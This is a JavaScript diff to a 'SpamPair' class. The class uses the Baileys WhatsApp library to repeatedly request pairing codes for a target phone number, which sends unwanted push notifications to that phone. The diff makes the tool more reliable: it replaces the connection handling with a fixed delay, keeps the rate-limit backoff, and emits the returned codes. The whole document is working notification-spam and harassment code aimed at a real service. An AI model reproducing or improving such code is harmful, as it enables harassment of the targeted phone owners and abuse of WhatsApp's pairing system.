@@ -64,7 +64,6 @@ class SpamPair extends EventEmitter {
   // ---------- CORE ATTEMPT — uses baileys WebSocket to trigger real pairing notification ----------
   async _attemptLink() {
     let sock = null;
-    let timeoutId = null;
     try {
       const { makeWASocket, initAuthCreds, DisconnectReason, makeCacheableSignalKeyStore, fetchLatestBaileysVersion, Browsers } = this._ensureBaileys();
 
@@ -77,55 +76,39 @@ class SpamPair extends EventEmitter {
 
       const { version } = await fetchLatestBaileysVersion();
 
-      // Wait for connection to be established
-      const connected = new Promise((resolve, reject) => {
-        timeoutId = setTimeout(() => reject(new Error('Connection timeout')), 15000);
-
-        sock = makeWASocket({
-          version,
-          browser: this._browser || Browsers.ubuntu('Chrome'),
-          auth: {
-            creds: state.creds,
-            keys: state.keys
-          },
-          generateHighQualityLinkPreview: false,
-          shouldSyncHistoryMessage: () => false,
-          getMessage: async () => undefined,
-          logger: { info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {}, child: () => ({ info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {} }) }
-        });
-
-        // Wait for connection update with 'open' or 'close'
-        const onConnectionUpdate = (update) => {
-          if (update.connection === 'open') {
-            clearTimeout(timeout);
-            sock.ev.off('connection.update', onConnectionUpdate);
-            resolve(sock);
-          } else if (update.connection === 'close' && update.lastDisconnect) {
-            clearTimeout(timeout);
-            sock.ev.off('connection.update', onConnectionUpdate);
-            reject(update.lastDisconnect?.error || new Error('Connection closed'));
-          }
-        };
-        sock.ev.on('connection.update', onConnectionUpdate);
+      // Create socket — baileys handles WebSocket connect + noise handshake internally
+      sock = makeWASocket({
+        version,
+        browser: this._browser || Browsers.ubuntu('Chrome'),
+        auth: {
+          creds: state.creds,
+          keys: state.keys
+        },
+        generateHighQualityLinkPreview: false,
+        shouldSyncHistoryMessage: () => false,
+        getMessage: async () => undefined,
+        connectTimeoutMs: 12000,
+        defaultQueryTimeoutMs: 12000,
+        logger: { info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {}, child: () => ({ info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {} }) }
       });
 
-      await connected;
+      // Wait 4 seconds for WebSocket connect + noise handshake (same approach as pair.js)
+      // Important: 'connection:open' only fires after CB:success (authenticated login),
+      // which never comes for fresh unregistered sockets. So we use a fixed delay.
+      await this._sleep(4000);
+
+      // Check if the socket's WebSocket is actually connected
+      if (!sock.ws || !sock.ws.isOpen) {
+        throw new Error('WebSocket not connected after 4s');
+      }
 
       // Request pairing code — this sends the actual WhatsApp XML stanza
       // that triggers a push notification to the target phone
-      await sock.requestPairingCode(this.phone);
+      const code = await sock.requestPairingCode(this.phone);
 
       this.stats.attempts++;
-
-      // Small delay to let the notification go through
-      await this._sleep(500);
-
-      // Disconnect the temp socket
-      sock.end(new Error('SpamPair: done'));
-      sock = null;
-
       this.stats.success++;
-      this.emit('success', { phone: this.phone, attempt: this.stats.attempts });
+      this.emit('success', { phone: this.phone, attempt: this.stats.attempts, code });
       return true;
 
     } catch (error) {
@@ -137,9 +120,9 @@ class SpamPair extends EventEmitter {
       if (errMsg.includes('429') || errMsg.includes('rate-overlimit') || errMsg.includes('too-fast')) {
         this.emit('rate-limit', { phone: this.phone, detail: errMsg });
         await this._sleep(10000);
-      } else if (errMsg.includes('Connection timeout') || errMsg.includes('connect')) {
+      } else if (errMsg.includes('WebSocket not connected') || errMsg.includes('connect')) {
         // Connection issues — wait longer
-        await this._sleep(5000);
+        await this._sleep(6000);
       }
 
       return false;
@@ -147,7 +130,6 @@ class SpamPair extends EventEmitter {
       if (sock) {
         try { sock.end(new Error('SpamPair: cleanup')); } catch (_) {}
       }
-      if (timeoutId) clearTimeout(timeoutId);
     }
   }
 
